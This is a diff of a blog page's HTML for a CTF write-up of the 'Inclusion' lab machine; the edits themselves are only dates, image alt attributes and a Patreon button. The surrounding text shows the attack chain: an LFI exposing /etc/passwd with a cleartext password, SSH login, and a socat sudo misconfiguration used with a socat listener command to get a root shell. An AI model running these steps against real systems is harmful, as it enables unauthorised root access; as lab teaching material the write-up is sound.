@@ -22,7 +22,7 @@
     <meta property="og:url" content="https://fr33s0ul.tech/inclusion-ctf-write-up/">
     <meta property="og:image" content="https://fr33s0ul.tech/content/images/size/w1000/2020/04/cdsczxcasdasdqw-2.png">
     <meta property="article:published_time" content="2020-04-10T14:45:16.000Z">
-    <meta property="article:modified_time" content="2020-04-17T15:04:08.000Z">
+    <meta property="article:modified_time" content="2020-11-21T15:23:50.000Z">
     <meta property="article:tag" content="CTF">
     
     <meta name="twitter:card" content="summary_large_image">
@@ -71,7 +71,7 @@
     "headline": "Inclusion | CTF write-up",
     "url": "https://fr33s0ul.tech/inclusion-ctf-write-up/",
     "datePublished": "2020-04-10T14:45:16.000Z",
-    "dateModified": "2020-04-17T15:04:08.000Z",
+    "dateModified": "2020-11-21T15:23:50.000Z",
     "image": {
         "@type": "ImageObject",
         "url": "https://fr33s0ul.tech/content/images/size/w1000/2020/04/cdsczxcasdasdqw.png",
@@ -219,7 +219,7 @@ Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 
 Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
 Nmap done: 1 IP address (1 host up) scanned in 7.02 seconds
-root@kali:~#</code></pre><p>We have two ports open 22 for SSH and 80 for HTTP running under python, which I think running django ... anyways! </p><figure class="kg-card kg-image-card kg-card-hascaption"><img src="../content/images/2020/04/Screenshot-2020-04-10-at-16.00.48.png" class="kg-image"><figcaption>ow look at that LFI-attack!</figcaption></figure><figure class="kg-card kg-image-card kg-card-hascaption"><img src="../content/images/2020/04/Screenshot-2020-04-10-at-15.40.22.png" class="kg-image"><figcaption>ok</figcaption></figure><p>and we have the /etc/passwd and a clear password for our user down there ...</p><pre><code>root@kali:~# ssh falconfeast@10.10.94.6
+root@kali:~#</code></pre><p>We have two ports open 22 for SSH and 80 for HTTP running under python, which I think running django ... anyways! </p><figure class="kg-card kg-image-card kg-card-hascaption"><img src="../content/images/2020/04/Screenshot-2020-04-10-at-16.00.48.png" class="kg-image" alt><figcaption>ow look at that LFI-attack!</figcaption></figure><figure class="kg-card kg-image-card kg-card-hascaption"><img src="../content/images/2020/04/Screenshot-2020-04-10-at-15.40.22.png" class="kg-image" alt><figcaption>ok</figcaption></figure><p>and we have the /etc/passwd and a clear password for our user down there ...</p><pre><code>root@kali:~# ssh falconfeast@10.10.94.6
 The authenticity of host '10.10.94.6 (10.10.94.6)' can't be established.
 ECDSA key fingerprint is SHA256:VRi7CZbTMsqjwnWmH2UVPWrLVIZzG4BQ9J6X+tVsuEQ.
 Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
@@ -255,7 +255,7 @@ Matching Defaults entries for falconfeast on inclusion:
 
 User falconfeast may run the following commands on inclusion:
     (root) NOPASSWD: /usr/bin/socat
-falconfeast@inclusion:~$</code></pre><p>we are user falconfeast ! and we have a NOPASSWD SUDO FOR SOCAT .... speaking of socat, there's a PoC in <strong>GTFObins</strong>, I really recommend checking the website it does have a lot of good knowledge.</p><figure class="kg-card kg-image-card"><img src="../content/images/2020/04/Screenshot-2020-04-10-at-15.46.56.png" class="kg-image"></figure><pre><code>root@kali:~# socat file:`tty`,raw,echo=0 tcp-listen:5151
+falconfeast@inclusion:~$</code></pre><p>we are user falconfeast ! and we have a NOPASSWD SUDO FOR SOCAT .... speaking of socat, there's a PoC in <strong>GTFObins</strong>, I really recommend checking the website it does have a lot of good knowledge.</p><figure class="kg-card kg-image-card"><img src="../content/images/2020/04/Screenshot-2020-04-10-at-15.46.56.png" class="kg-image" alt></figure><pre><code>root@kali:~# socat file:`tty`,raw,echo=0 tcp-listen:5151
 </code></pre><pre><code>falconfeast@inclusion:~$ sudo -l
 Matching Defaults entries for falconfeast on inclusion:
     env_reset, mail_badpass,
@@ -272,7 +272,7 @@ sh: 0: can't access tty; job control turned off
 # id                                                                                
 uid=0(root) gid=0(root) groups=0(root)
 # 
-</code></pre><p>and that's it here, go get your flags! </p><!--kg-card-begin: html--><iframe src="https://giphy.com/embed/xjZtu4qi1biIo" width="480" height="360" frameborder="0" class="giphy-embed" allowfullscreen></iframe><p><a href="https://giphy.com/gifs/thumbs-up-xjZtu4qi1biIo"></a></p><!--kg-card-end: html--><p>Happy Hacking!</p>
+</code></pre><p>and that's it here, go get your flags! </p><!--kg-card-begin: html--><iframe src="https://giphy.com/embed/xjZtu4qi1biIo" width="480" height="360" frameborder="0" class="giphy-embed" allowfullscreen></iframe><p><a href="https://giphy.com/gifs/thumbs-up-xjZtu4qi1biIo"></a></p><!--kg-card-end: html--><p>Happy Hacking!</p><!--kg-card-begin: html--><a href="https://www.patreon.com/bePatron?u=45903047" data-patreon-widget-type="become-patron-button">You can support my content, and help me do more and more by becoming a Patron!</a><script async src="https://c6.patreon.com/becomePatronButton.bundle.js"></script><!--kg-card-end: html-->
                 </div>
             </section>
 
